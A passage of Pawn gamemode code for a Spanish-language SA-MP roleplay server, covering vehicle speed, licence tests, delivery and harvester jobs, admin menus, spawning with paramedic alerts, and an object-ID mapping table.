			DestroyDynamicObject(objectid);
			CreateDynamicObject(3931, x, y, z, rx, ry, rz);
		}
		else if(response == EDIT_RESPONSE_CANCEL)
		{
			DeletePVar(playerid, "AcomodandoMinerales");
			DestroyDynamicObject(objectid);
		}
	}
	return 1;
}

stock SetVehicleSpeed(vehicleid, Float:speed)//Milanosie
{
    if(speed != -1)
    {
		new
			Float:px,
			Float:py,
			Float:pz,
			Float:pvx,
			Float:pvy,
			Float:pvz,
			Float:fl;

		GetVehiclePos(vehicleid, px,py, pz);
		GetVehicleVelocity(vehicleid, pvx, pvy, pvz);
		if(pvx == 0) pvx += 0.0001;
		if(pvy == 0) pvy += 0.0001;
		if(pvz == 0) pvz += 0.0001;
		fl = floatsqroot((pvx * pvx) + (pvy * pvy) + (pvz * pvz));
		pvx = (pvx / fl) * (speed * 0.00475);
		pvy = (pvy / fl) * (speed * 0.00475);
		pvz = (pvz / fl) * (speed * 0.00475);
		SetVehicleVelocity(vehicleid, pvx, pvy, pvz);
	}
 	return 1;
}

stock GetVehicleSpeed(vehicleid)//Milanosie
{
    new
    	Float:x_speed, Float:y_speed, Float:z_speed, Float:speedf, speed;


    GetVehicleVelocity(vehicleid,x_speed,y_speed,z_speed);
    speedf = floatsqroot(((x_speed*x_speed)+(y_speed*y_speed))+(z_speed*z_speed)) * 187.666667;
    speed = floatround(speedf,floatround_round);
    return speed;
}

stock GetPlayerSpeed(playerid)
{
    new Float:ST[4];
	GetPlayerVelocity(playerid,ST[0],ST[1],ST[2]);
    ST[3] = floatsqroot(floatpower(floatabs(ST[0]), 2.0) + floatpower(floatabs(ST[1]), 2.0) + floatpower(floatabs(ST[2]), 2.0)) * 179.28625;
    return floatround(ST[3]);
}

CALLBACK: TiempoLicencia(playerid)
{
	new StrSeg[80];
	new Segs = GetPVarInt(playerid,"LIC_Segundos");
	if(Segs <= 0)
	{
		A_Format(StrSeg,"~w~Agarraste ~p~%d~w~ puntos",GetPVarInt(playerid,"LIC_Checks"));
	    new Float:VidaVeh;
	    GetVehicleHealth(GetPlayerVehicleID(playerid),VidaVeh);
	    if(VidaVeh >= 65)
	    {
	        if(GetPVarInt(playerid,"LIC_Checks") >= 25)
	        {
		        strins(StrSeg,"~g~test aprobado~n~~n~",0);
				if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 426)
				{
					Mensaje(playerid,-1,"> Felicidades, ¡obtubiste la licencia de "#CPOSITIVO"AUTOS!");
				    InfoJugador[playerid][jLicenciaAuto] = true;
				}
				else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 521)
				{
					Mensaje(playerid,-1,"> Felicidades, ¡obtubiste la licencia de "#CPOSITIVO"MOTOS!");
				    InfoJugador[playerid][jLicenciaMoto] = true;
				}
			}
			else strins(StrSeg,"~r~test desaprobado ~n~(puntos insuficientes)~n~~n~",0);
	    }
	    else strins(StrSeg,"~r~test desaprobado ~n~(vehiculo destruido)~n~~n~",0);
	    new
	        VehID = GetPlayerVehicleID(playerid) != INVALID_VEHICLE_ID;

		GameTextForPlayer(playerid,StrSeg,6000,3);
		KillTimer2(playerid,TIMER_LICENCIA);
		DestroyPCP(playerid,CP_LICENCIAVEH);
		RemovePlayerFromVehicle(playerid);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid,3);
		SetPlayerPos(playerid,-2029.9017,-119.1597,1035.1719);
		SetVehicleToRespawn(VehID);
		AutoLicenciaUsado[GetPVarInt(playerid, "LIC_VEH_INDEX")][GetPVarInt(playerid, "LIC_VEH_INDEX_2")] = false;
		DeletePVar(playerid, "LIC_VEH_INDEX");
		DeletePVar(playerid, "LIC_VEH_INDEX_0");
		return 1;
	}
	A_Format(StrSeg,"~n~~n~~n~~n~~n~~n~~r~Segundos restantes: ~w~%d~n~~r~puntos: ~w~%d/25",Segs,GetPVarInt(playerid,"LIC_Checks"));
	GameTextForPlayer(playerid,StrSeg,1600,3);
	SetPVarInt(playerid,"LIC_Segundos",(Segs-1));
	return 1;
}

stock EsMoto(vehid)
{
	switch(vehid)
	{
	    case 448,461,462,463,468,521..523,581,586: return 1;
	}
	return 0;
}

stock EsBarco(vehid)
{
	switch(vehid)
	{
		case 430,446,452,453,454,472,473,493,595: return 1;
	}
	return 0;
}

CALLBACK: CheckpointEntrega(playerid)
{
	if(GetPVarInt(playerid,"PasoEntrega") == 1)
	{
		new
		TEntrega = GetPVarInt(playerid,"Tipo_Entrega"),
		LEntrega = GetPVarInt(playerid,"Lugar_Entrega"),
		Info[18],Info2[26];
		switch(TEntrega)
		{
		    case 1:
		    {
		    	SetPlayerCP(playerid,CP_CAMIONERO, ProductosVariosRandom[LEntrega][ePosx],ProductosVariosRandom[LEntrega][ePosy],ProductosVariosRandom[LEntrega][ePosz],5);
		    	Info = "estos productos";
				alm(Info2,ProductosVariosRandom[LEntrega][NombreEntrega]);
			}
		    case 2:
		    {
		    	SetPlayerCP(playerid,CP_CAMIONERO, RopaRandom[LEntrega][ePosx],RopaRandom[LEntrega][ePosy],RopaRandom[LEntrega][ePosz],5);
		    	Info = "esta ropa";
				alm(Info2,RopaRandom[LEntrega][NombreEntrega]);
			}
		    case 3:
		    {
		    	SetPlayerCP(playerid,CP_CAMIONERO, ComidaRandom[LEntrega][ePosx],ComidaRandom[LEntrega][ePosy],ComidaRandom[LEntrega][ePosz],5);
		    	Info = "estos alimentos";
				alm(Info2,ComidaRandom[LEntrega][NombreEntrega]);
			}
		}
		Descongelar(playerid);
		MensajeF(playerid,C_INFO,"> "#CBLANCO"Debes entregar %s en "#CINFO"%s",Info,Info2);
		Mensaje(playerid,C_INFO,"> "#CBLANCO"Se te marcó en el mapa el punto de entrega de estos productos.");
	}
	else if(GetPVarInt(playerid,"PasoEntrega") == 2)
	{
	    Mensaje(playerid,C_INFO,"> "#CBLANCO"Ya entregaste los productos, ahora regresa para confirmar la entrega y recibir tu paga");
		SetPlayerCP(playerid,CP_CAMIONERO, 2640.8167,-2139.0896,13.54,5);
	}
	return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
	new VehID = GetPlayerVehicleID(playerid);
	if(GetPVarInt(playerid,"EstaCultivando"))
	{
		if(EsCosechadora(VehID))
		{
		    if(GetPVarInt(playerid,"COSECHANDO_ID") == 0)
		    {
		        new i = GetPVarInt(playerid,"ParteCosecha");
				SetProgressBarValue(BCosecha[playerid],i);
				UpdateProgressBar(BCosecha[playerid], playerid);
			    new Par = (sizeof PosCosechador)-1;
				if(i == Par)
				{
		        	SetPlayerRaceCheckpoint(playerid,1,PosCosechador[Par][0],PosCosechador[Par][1],PosCosechador[Par][2], PosCosechador[Par][0],PosCosechador[Par][1],PosCosechador[Par][2],7);
	       		 	SetPVarInt(playerid,"ParteCosecha",1000);
					return 1;
				}
				if(i == 1000)
				{
		 		    new RVal = Rand(200,300);
					GivePlayerMoney(playerid,RVal);
				    Mensaje(playerid,-1,"• Trabajo "#CVERDE"finalizado "#CBLANCO"con éxito.");
					Mensaje(playerid,  1,"==================================");
					MensajeF(playerid,-1,".. Paga: "#CVERDE"$%d", RVal);
					Mensaje(playerid,  1,"==================================");
					DeletePVar(playerid,"ParteCosecha");
					DeletePVar(playerid,"EstaCultivando");
					InfoJugador[playerid][jCosechas] ++;
					if(InfoJugador[playerid][jCosechas] >= 50 && InfoJugador[playerid][jNivelTrabajo] < 2)
					{
						Mensaje(playerid, -1,"Felicitaciones, subiste a nivel "#CVERDE"2 "#CBLANCO"en tu trabajo: "#CAZUL2"Cosechador");
						Mensaje(playerid, -1,"Ahora, podrás cosechar "#CVIOLETA"TRIGO "#CBLANCO"y recibirás más dinero.");
						InfoJugador[playerid][jNivelTrabajo] = 2;
					}
					DisablePlayerRaceCheckpoint(playerid);
					RemovePlayerFromVehicle(playerid);
					SetVehicleToRespawn(VehID);
					HideProgressBarForPlayer(playerid,BCosecha[playerid]);
		        	DeletePVar(playerid, "COSECHANDO_ID");
					TrabajosPorHora[playerid][ID_Cosechador] ++;
		        	return 1;
				}
				if(i < Par)
				{
					SetPlayerRaceCheckpoint(playerid,0,PosCosechador[i][0],PosCosechador[i][1],PosCosechador[i][2],PosCosechador[i+1][0],PosCosechador[i+1][1],PosCosechador[i+1][2],7);
			        SetPVarInt(playerid,"ParteCosecha",i+1);
				}
				return 1;
			}
			else if(GetPVarInt(playerid,"COSECHANDO_ID") == 1)
			{
				#define PosCosechador PosCosechadorLVL2
		        new i = GetPVarInt(playerid,"ParteCosecha");
				SetProgressBarValue(BCosecha[playerid],i);
				UpdateProgressBar(BCosecha[playerid], playerid);
			    new Par = (sizeof PosCosechador)-1;
				if(i == Par)
				{
		        	SetPlayerRaceCheckpoint(playerid,1,PosCosechador[Par][0],PosCosechador[Par][1],PosCosechador[Par][2], PosCosechador[Par][0],PosCosechador[Par][1],PosCosechador[Par][2],7);
	       		 	SetPVarInt(playerid,"ParteCosecha",1000);
					return 1;
				}
				if(i == 1000)
				{
		 		    new RVal = Rand(500,600);
					GivePlayerMoney(playerid,RVal);
				    Mensaje(playerid,-1,"• Trabajo "#CVERDE"finalizado "#CBLANCO"con éxito.");
					Mensaje(playerid,  1,"==================================");
					MensajeF(playerid,-1,".. Paga: "#CVERDE"$%d", RVal);
					Mensaje(playerid,  1,"==================================");
					DeletePVar(playerid,"ParteCosecha");
					DeletePVar(playerid,"EstaCultivando");
					InfoJugador[playerid][jCosechas] ++;
					DisablePlayerRaceCheckpoint(playerid);
					RemovePlayerFromVehicle(playerid);
					SetVehicleToRespawn(VehID);
					HideProgressBarForPlayer(playerid,BCosecha[playerid]);
		        	DeletePVar(playerid, "COSECHANDO_ID");
		        	return 1;
				}
				if(i < Par)
				{
					SetPlayerRaceCheckpoint(playerid,0,PosCosechador[i][0],PosCosechador[i][1],PosCosechador[i][2],PosCosechador[i+1][0],PosCosechador[i+1][1],PosCosechador[i+1][2],7);
			        SetPVarInt(playerid,"ParteCosecha",i+1);
				}
		        #undef PosCosechador
				return 1;
			}
			else if(GetPVarInt(playerid,"COSECHANDO_ID") == 2)
			{
				#define PosCosechador PosCosechadorMari
		        new i = GetPVarInt(playerid,"ParteCosecha");
				SetProgressBarValue(BCosecha[playerid],i);
				UpdateProgressBar(BCosecha[playerid], playerid);
 			    new Par = (sizeof PosCosechador)-1;
				if(i == Par)
				{
		        	SetPlayerRaceCheckpoint(playerid,1,PosCosechador[Par][0],PosCosechador[Par][1],PosCosechador[Par][2], PosCosechador[Par][0],PosCosechador[Par][1],PosCosechador[Par][2],7);
	       		 	SetPVarInt(playerid,"ParteCosecha",1000);
					return 1;
				}
				if(i == 1000)
				{
		 		    new RVal = random(4);
		 		    if(!RVal) RVal = 1;
					MensajeF(playerid, C_INFO,"> "#CBLANCO"Cosecha realizada con éxito, se te dio "#CPOSITIVO"%d "#CBLANCO"de marihuana.",RVal);
					DeletePVar(playerid,"ParteCosecha");
					InfoJugador[playerid][jDroga][DROGA_MARIHUANA] += RVal;
					DeletePVar(playerid,"EstaCultivando");
					InfoJugador[playerid][jCosechas] ++;
					DisablePlayerRaceCheckpoint(playerid);
					RemovePlayerFromVehicle(playerid);
					SetVehicleToRespawn(VehID);
					HideProgressBarForPlayer(playerid,BCosecha[playerid]);
		        	DeletePVar(playerid, "COSECHANDO_ID");
		        	return 1;
				}
				if(i < Par)
				{
					SetPlayerRaceCheckpoint(playerid,0,PosCosechador[i][0],PosCosechador[i][1],PosCosechador[i][2],PosCosechador[i+1][0],PosCosechador[i+1][1],PosCosechador[i+1][2],7);
			        SetPVarInt(playerid,"ParteCosecha",i+1);
				}
		        #undef PosCosechador
				return 1;
			}
		}
	}
	return 1;
}

CALLBACK: VolverCamion(playerid)
{
	Descongelar(playerid);
	SetPVarInt(playerid,"PasoEntrega",2);
	CheckpointEntrega(playerid);
	InfoCamion[GetPlayerVehicleID(playerid)][camCarga] = 0;
	return 1;
}

stock DarPlataGobierno(plata)
{
	InfoFaccion[IDGOBIERNO][fDinero] += plata;
	ActualizarFacciones();
	return 1;
}

EstaEnTiendaRopa(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid,2,181.5338,-86.7284,1002.0234) ||//Zip
	IsPlayerInRangeOfPoint(playerid,2,208.8329,-3.5260,1001.2178) ||//Victim
	IsPlayerInRangeOfPoint(playerid,2,214.6280,-40.2542,1002.0234) ||//SubUrban
	IsPlayerInRangeOfPoint(playerid,2,202.0402,-131.0054,1003.5078) ||//ProLaps
	IsPlayerInRangeOfPoint(playerid,2,215.9159,-154.7793,1000.5234) ||//Didier
	IsPlayerInRangeOfPoint(playerid,2,217.5361,-97.7467,1005.2578))	 //Binco
	return true;
	else return false;
}


stock EsNumerico(str[])
{
	if(strval(str) == 0) return 0;
	return 1;
}

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	if(!InfoJugador[playerid][jAdmin]) return 0;
	Para_Admin_Servicio
	SetPVarInt(playerid,"ClickedID",clickedplayerid);
	SetPVarInt(playerid,"ADM_Click",0);

 	new
		ADM_HEAD[MAX_PLAYER_NAME+30];

	A_Format(ADM_HEAD, ""#CBLANCO"ADMINISTRACIÓN >> "#CHAMBRE"%s", pName(clickedplayerid));

	switch(InfoJugador[playerid][jAdmin])
	{
	    case Colaborador:
			Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,ADM_HEAD,"- Ir a el\n- Congelar/descongelar\n- Bofetear","Aceptar","Cancelar");

	    case Moderador:
			Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,ADM_HEAD,"- Ir a el\n- Congelar/descongelar\n- Bofetear\n- Mutear/Desmutear\n- Skin\n- Interior\n- Virtual world\n- Traer\n- Vida\n- Encarcelar","Aceptar","Cancelar");

	    case Mod.Superior:
			Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,ADM_HEAD,"- Ir a el\n- Congelar/descongelar\n- Bofetear\n- Mutear/Desmutear\n- Skin\n- Interior\n- Virtual world\n- Traer\n- Vida\n- Encarcelar\n- Kick\n- Ban","Aceptar","Cancelar");

	    case Administrador, AdministradorSup:
			Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,ADM_HEAD,"- Ir a el\n- Congelar/descongelar\n- Bofetear\n- Mutear/Desmutear\n- Skin\n- Interior\n- Virtual world\n- Traer\n- Vida\n- Encarcelar\n- Kick\n- Ban\n- Familia\n- Facción","Aceptar","Cancelar");

	    case SubDueno,Dueno:
			Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,ADM_HEAD,"- Ir a el\n- Congelar/descongelar\n- Bofetear\n- Mutear/Desmutear\n- Skin\n- Interior\n- Virtual world\n- Traer\n- Vida\n- Encarcelar\n- Kick\n- Ban\n- Familia\n- Facción\n- Dinero","Aceptar","Cancelar");

		default: return 0;
	}

	return 1;
}

public OnPlayerRequestSpawn(playerid) return 0;

public OnPlayerSelectObject(playerid, type, objectid, modelid, Float:fX, Float:fY, Float:fZ)
{
	if(type == SELECT_OBJECT_PLAYER_OBJECT)
	{
		if(GetPVarInt(playerid,"EditandoMuebles"))
		{
			Loop(m, MAX_MUEBLES_CASA, 0)
			{
			    if(objectid == OBJ_Mueble[playerid][m])
			    {
			        SetPVarInt(playerid,"ID_MUEBLE",m);
					EditPlayerObject(playerid, OBJ_Mueble[playerid][m]);
					return 1;
				}
			}
			return Error(playerid,"¡Ese objeto no te pertenece!");
		}
	}
	return 1;
}

public OnPlayerSelectDynamicObject(playerid, objectid, modelid, Float:x, Float:y, Float:z)
{
    if(EsDueno(playerid))
    {
        MensajeF(playerid, -1, "ID: %d", objectid);
        EditDynamicObject(playerid, objectid);
	}
    return 1;
}

public OnPlayerSpawn(playerid)
{
	if(IsPlayerNPC(playerid))
	{
		new
			name[24];
		GetPlayerName(playerid, name, 24);

		if(!strcmp(name, "Claudia", true))
		{
			new Text3D:NombreBOT = Create3DTextLabel("Claudia",C_BLANCO,0,0,0,10.0,1);
			Attach3DTextLabelToPlayer(NombreBOT,playerid,0,0,0.2);
			SetPlayerSkin(playerid, 150);
			SetPlayerAttachedObject(playerid, 0, 2356, 7, -0.0600, -0.6340, 0.0459, -88.8999, -7.2999, -104.5000, 1.0000, 1.0000, 1.0000);
			return 1;
		}
	}

 	SetTimerEx("CargarAttachedO",1000,false,"i",playerid);

	if(!GetPVarInt(playerid, "_SPECTEANDO")) return _OnPlayerSpawn(playerid), true;

	return true;
}

CALLBACK: KillPlayer(playerid)
{
	if(GetPlayerAnimationIndex(playerid) == 1701)
	{
	    new
	        Float:Vida;

		GetPlayerHealth(playerid, Vida);
		Vida -= 0.4;
		if(Vida)
		{
	   		SetPlayerHealth(playerid, Vida);
	   		SetPVarFloat(playerid, "VIDA_PERDIDA", Vida);
		}
		else
		{
		    KillTimer2(playerid, TIMER_VAAMORIR);
	   		SetPlayerHealth(playerid, 0);
	   		SetPVarFloat(playerid, "VIDA_PERDIDA", 0.0);
		}
	}
	return 1;
}

CALLBACK: AvisarMedicos(playerid)
{
	KillTimer2(playerid, TIMER_VAAMORIR);

	Timer_Jugador[playerid][TIMER_VAAMORIR] = SetTimerEx("KillPlayer", 1000, true, "i", playerid);

	switch(random(6))
	{
	    case 0: Mensaje(playerid,-1,"¡Un niño te vio tirado, y el llamó una ambulancia! Vienen por ti.");
	    case 1: Mensaje(playerid,-1,"Alguien te vio tirado, y llamo a emergencias. ¡Aguanta un poco más!");
	    case 2: Mensaje(playerid,-1,"Una mujer llamó al hospital porque te vio herido.");
	    case 3: Mensaje(playerid,-1,"Un comerciante llamó a la ambulancia porque te vio tirado.");
	    case 4: Mensaje(playerid,-1,"¡Un hombre te vio herido y llamó a emergencias! Espera que te busquen.");
	    case 5: Mensaje(playerid,-1,"¡Un anciano llamó al hospital porque te vio herido!");
	}

	Mensaje(playerid,-1,"- Si los medicos no llegan pronto, podrias desmayarse.");
	Mensaje(playerid,C_ROJO,"NOTA: "#CBLANCO"Puede utilizar "#CINFO"/suicidio "#CVERDE"($1000) "#CBLANCO"para ir directamente al hospital.");
	
	MensajeFaccion(IDLSMD, "- ¡Se reportó un herido! Se necesita una unidad urgente. "#CVERDE"(( Punto verde ))");

	new NegID;

	if(!GetPlayerInterior(playerid))
	{
		foreach(Player,i) if(EsMedico(i))
		{
		    SetPlayerMarkerForPlayer(i, playerid, C_VERDE );
		}

		SetTimerEx("DesmarcarPos", 90000, false, "iii", playerid, IDLSMD, 0);

		return true;
 	}
	else if(EstaEnNegocio(playerid))
	{
 		NegID = ID_Negocio(playerid);
		foreach(Player,i) if(EsMedico(i))
	    {
			SetPlayerMapIcon(i, MI_HERIDO, InfoNegocio[NegID][nEntrada_x], InfoNegocio[NegID][nEntrada_y], InfoNegocio[NegID][nEntrada_z] , 0, C_VERDE, MAPICON_GLOBAL);
		}
	}
	else if(EstaEnCasa(playerid))
	{
 		NegID = ID_Casa(playerid);
		foreach(Player,i) if(EsMedico(i))
	    {
			SetPlayerMapIcon(i, MI_HERIDO, InfoCasa[NegID][cEntrada_x], InfoCasa[NegID][cEntrada_y], InfoCasa[NegID][cEntrada_z] , 0, C_VERDE, MAPICON_GLOBAL);
		}
	}
	else if(EstaEnInterior(playerid))
	{
 		NegID = ID_Interior(playerid);
		foreach(Player,i) if(EsMedico(i))
	    {
			SetPlayerMapIcon(i, MI_HERIDO, InfoInterior[NegID][intEntrada_x], InfoInterior[NegID][intEntrada_y], InfoInterior[NegID][intEntrada_z] , 0, C_VERDE, MAPICON_GLOBAL);
		}
	}

	SetTimerEx("_BorrarMIHerido", 90000, false, "i", playerid);

	return 1;
}

CALLBACK: _BorrarMIHerido()
{
	foreach(Player,i) if(EsMedico(i))
	{
		RemovePlayerMapIcon(i, MI_HERIDO);
	}
	return 1;
}




_OnPlayerSpawn(playerid)
{

	if(GetPVarInt(playerid,"Logueado") == 0) return ( Error(playerid,"Logueate mediante el dialogo"),Kick(playerid) );

	SetTimerEx("RealSpawn",500,false,"i",playerid);

	if(GetPVarInt(playerid,"Spawn_Spec")) return 1;
	if(GetPVarInt(playerid,"ESPOSADO")) SetPlayerSpecialAction(playerid,SPECIAL_ACTION_CUFFED);

	// Usuario nuevo

	if(InfoJugador[playerid][jRegistrado] == false)
	{
		Registrar(playerid);
		SendClientMessage(playerid,C_INFO,"> "#CBLANCO"Configure su personaje, presione click en las flechas para cambiar");
		return 1;
	}
	if(InfoJugador[playerid][jRegistrado] == true)
	{
		if(InfoJugador[playerid][jEncarcelado])
		{
		    Mensaje(playerid,-1,"¡Sigues con tu condena!");
			if(InfoJugador[playerid][jEncarcelado] == 2)
			{
				SetPlayerPos(playerid,424.1288,-2481.9368,-27.9431);
				SetPlayerVirtualWorld(playerid, 5000+playerid);
				SetPlayerInterior(playerid, 0);
				//SetPlayerWorldBounds(playerid,421.1088,-2484.9893,427.7379,-2478.2310);
				if(TextoCarcel[playerid] == PlayerText3D:INVALID_3DTEXT_ID)
				{
				    new
				        Txt[sizeof(TextoDeCarcel)];

					strcat(Txt, TextoDeCarcel);
				    TextoCarcel[playerid] = CreatePlayer3DTextLabel(playerid, Txt, C_ROJO, 424.1288,-2481.9368,-27.9431, 4.0);
				}

			}
   			else
			{
				SetPlayerPos(playerid,2551.5344,-1304.6704,1031.4219);
				SetPlayerInterior(playerid,2);
			}

			KillTimer2(playerid,TIMER_CARCEL);
			Timer_Jugador[playerid][TIMER_CARCEL] = SetTimerEx("ActualizarTiempoCarcel",1000,true,"i",playerid);
		}
		else
		{
			if(GetPVarInt(playerid,"Spawneo") == 1)
			{
				if(InfoJugador[playerid][jMuerto] == true)
				{
				    SetTimerEx("AvisarMedicos", Rand(1000,8000), false, "i", playerid);

					Bit_Set(AnimsLocked, playerid, true);

					ApplyAnimation(playerid, "WUZI", "CS_Dead_Guy", 4.0, 0, 0, 0, 1, 0);

					SetPlayerHealth(playerid,100);
					SetPlayerInterior(playerid, GetPVarInt(playerid, "ULTIMO_INT") );
					SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "ULTIMO_VW") );
					DeletePVar(playerid, "ULTIMO_INT");
					DeletePVar(playerid, "ULTIMO_VW");

				    return true;
				}
				else
				{
					SetPlayerFacingAngle(playerid,180);
					SetPlayerInterior(playerid,3);
					Mensaje(playerid,-1,"Médico: Al fin despertaste, estubiste inconciente unas horas.");
					Mensaje(playerid,-1,"Médico: Quizá te sientas algo mareado, pronto se te pasará.");
					SetTimerEx("YaSeCuro",20000, false, "i", playerid);
					SetPlayerDrunkLevel(playerid,10000);
					SetTimerEx("cmd_crack",10,false,"is",playerid, " " );
					SetPlayerHealth(playerid,50);
					CongelarEx(playerid,6);
					
					InfoJugador[playerid][jCansancio] = 39.0;
					InfoJugador[playerid][jHambre] = 30.0;
					SetProgressBarValue(BCansancio[playerid], 39.0);
					UpdateProgressBar(BCansancio[playerid], playerid);
					
					cmd_dormir(playerid, "");
					Bit_Set(AnimsLocked, playerid, true);

				}
			}
		}
	}
	return 1;
}


CALLBACK: YaSeCuro(playerid)
{
	if(!IsPlayerConnected(playerid)) return 1;
    ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
	SetPlayerDrunkLevel(playerid,1);
	Bit_Set(AnimsLocked, playerid, false);
	Descongelar(playerid);
	return 1;
}

PreloadAnimLib(playerid, animlib[])
{
	ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
}

//Limpiar pantalla

stock LimpiarPantalla(playerid,lineas)
{
	Loop(i,lineas,0) Mensaje(playerid,-1,"");
 	return 1;
}

stock CamaraAleatoria(playerid)
{
	new RandomCancion;
	RandomCancion = random(4);
	TogglePlayerSpectating(playerid, true);
 	switch(RandomCancion)
  	{
   		case 0:// Edificio (Universidad)
     	{
			SetPlayerCameraPos(playerid, 127.6536, -1772.9319, 139.3198);
			SetPlayerCameraLookAt(playerid, 128.3242, -1772.1840, 138.9148);
			InterpolateCameraPos_(playerid,504.3114, -1703.9175, 139.6051, 30000);
			InterpolateCameraLookAt_(playerid,503.3851, -1703.5283, 139.2451, 30000);
		}
   		case 1:// Vinewood, la calle.
     	{
			SetPlayerCameraPos(playerid, 1344.9446, -1087.3927, 31.8767);
			SetPlayerCameraLookAt(playerid, 1344.9410, -1088.3977, 31.5660);
			InterpolateCameraPos_(playerid,1340.8271, -1451.8268, 21.5504, 30000);
			InterpolateCameraLookAt_(playerid,1340.5046, -1452.7788, 21.4296, 30000);
		}
   		case 2:// Edificio alto
     	{
			SetPlayerCameraPos(playerid, 1598.4633, -1274.2480, 61.8670);
			SetPlayerCameraLookAt(playerid, 1597.9485, -1275.1117, 61.3967);
			InterpolateCameraPos_(playerid,1580.1938, -1308.9076, 390.0625, 30000);
			InterpolateCameraLookAt_(playerid,1579.6166, -1309.7308, 388.8419, 30000);
		}
   		case 3:// Edificios
	    {
			SetPlayerCameraPos(playerid, 1905.0175, -1226.5602, 425.5548);
			SetPlayerCameraLookAt(playerid, 1904.0276, -1226.7338, 424.9185);
			InterpolateCameraPos_(playerid,1297.9652, -1320.9543, 329.0228, 30000);
			InterpolateCameraLookAt_(playerid, 1298.9701, -1320.9269, 328.6869, 20000);
		}
	}
	return 1;
}

stock UpdatePlayerVehicleTD(playerid, bool:total=false)
{
	#undef INVALID_TEXT_DRAW
		#define INVALID_TEXT_DRAW 0

	new
		VehP_Count;

	if(total == true)
	{
		Loop(i, MAX_VEH_PERSONA, 0)
		{
			if(VehTD[playerid][i] != PlayerText:INVALID_TEXT_DRAW)
			{
			    PlayerTextDrawDestroy(playerid, VehTD[playerid][i]);
			    VehTD[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
			}
		}
	}
	foreach(VehVenta, i)
	{
	    if(EsDuenoVeh(playerid, i))
	    {
	        if(VehTD[playerid][VehP_Count] == PlayerText:INVALID_TEXT_DRAW)
	        {
		        VehTD[playerid][VehP_Count] = CreatePlayerTextDraw(playerid, 550.000000, 310.000000-(VehP_Count*40), " ");
				PlayerTextDrawBackgroundColor(playerid, VehTD[playerid][VehP_Count], 0);
				PlayerTextDrawFont(playerid, VehTD[playerid][VehP_Count], 5);
				PlayerTextDrawLetterSize(playerid, VehTD[playerid][VehP_Count], 0.900000, 9.000000);
				PlayerTextDrawColor(playerid, VehTD[playerid][VehP_Count], -1395920385);
				PlayerTextDrawSetOutline(playerid, VehTD[playerid][VehP_Count], 0);
				PlayerTextDrawSetProportional(playerid, VehTD[playerid][VehP_Count], 1);
				PlayerTextDrawSetShadow(playerid, VehTD[playerid][VehP_Count], 1);
				PlayerTextDrawUseBox(playerid, VehTD[playerid][VehP_Count], 1);
				PlayerTextDrawBoxColor(playerid, VehTD[playerid][VehP_Count], 255);
				PlayerTextDrawTextSize(playerid, VehTD[playerid][VehP_Count], 100.000000, 100.000000);
				PlayerTextDrawSetPreviewRot(playerid, VehTD[playerid][VehP_Count], -10.000000, 0.000000, -40.000000, 1.000000);
			}
			PlayerTextDrawSetPreviewModel(playerid, VehTD[playerid][VehP_Count], GetVehicleModel(ID_Original(i)));
			PlayerTextDrawSetPreviewVehCol(playerid, VehTD[playerid][VehP_Count], InfoVeh[i][vColor1], InfoVeh[i][vColor2]);
			PlayerTextDrawShow(playerid, VehTD[playerid][VehP_Count]);
			VehP_Count++;
		}
	}
	#undef INVALID_TEXT_DRAW
		#define INVALID_TEXT_DRAW (0xFFFF)

	return 1;
}

stock CreateDynamicObject_e(ID,Float:x,Float:y,Float:z,Float:rx,Float:ry,Float:rz,x2 = -1,x3 = -1,x4 = -1,Stream = 200)
{
	return CreateDynamicObject(SAMP_MTAID(ID),x,y,z,rx,ry,rz,x2,x3,x4,Stream);
}

stock SAMP_MTAID(id)
{
	new objid = id;
	switch(objid)
	{
	    case 	18466: objid = 19347;
		case	18467: objid = 19353;
		case	18468: objid = 19354;
		case	18469: objid = 19355;
		case	9569: objid = 19356;
		case	9570: objid = 19357;
		case	9571: objid = 19358;
		case	9572: objid = 19359;
		case	9573: objid = 19360;
		case	9574: objid = 19361;
		case	9575: objid = 19362;
		case	9576: objid = 19363;
		case	9577: objid = 19364;
		case	9578: objid = 19365;
		case	9579: objid = 19366;
		case	9580: objid = 19367;
		case	9581: objid = 19368;
		case	9582: objid = 19369;
		case	9583: objid = 19370;
		case	9584: objid = 19371;
		case	9585: objid = 19372;
		case	9586: objid = 19373;
		case	9587: objid = 19374;
		case	9588: objid = 19375;
		case	9589: objid = 19376;
		case	9590: objid = 19377;
		case	9591: objid = 19378;
		case	9592: objid = 19379;
		case	9593: objid = 19380;
		case	9594: objid = 19381;
		case	9595: objid = 19382;
		case	9596: objid = 19383;
		case	9597: objid = 19384;
		case	9598: objid = 19385;
		case	9599: objid = 19386;
		case	9600: objid = 19387;
		case	9601: objid = 19388;
		case	9602: objid = 19389;
		case	9603: objid = 19390;
		case	9604: objid = 19391;
		case	9605: objid = 19392;
		case	9606: objid = 19393;
		case	9607: objid = 19394;
		case	9608: objid = 19395;
		case	9609: objid = 19396;
		case	9610: objid = 19397;
		case	9611: objid = 19398;
		case	9612: objid = 19399;
		case	9613: objid = 19400;
		case	9614: objid = 19401;
		case	9615: objid = 19402;
		case	9616: objid = 19403;
		case	9617: objid = 19404;
		case	9618: objid = 19405;
		case	9619: objid = 19406;
		case	9700: objid = 19407;
		case	9621: objid = 19408;
		case	9622: objid = 19409;
		case	9623: objid = 19410;
		case	9624: objid = 19411;
		case	9625: objid = 19412;
		case	9626: objid = 19413;
		case	9627: objid = 19414;
		case	9628: objid = 19415;
		case	9629: objid = 19416;
		case	9630: objid = 19417;
		case	18630: objid = 19426;
		case	18629: objid = 19427;
		case	18628: objid = 19428;
		case	18627: objid = 19429;
		case	18626: objid = 19430;
		case	18625: objid = 19431;
		case	18624: objid = 19432;
		case	18623: objid = 19433;
		case	18622: objid = 19434;
		case	18621: objid = 19435;
		case	18620: objid = 19436;
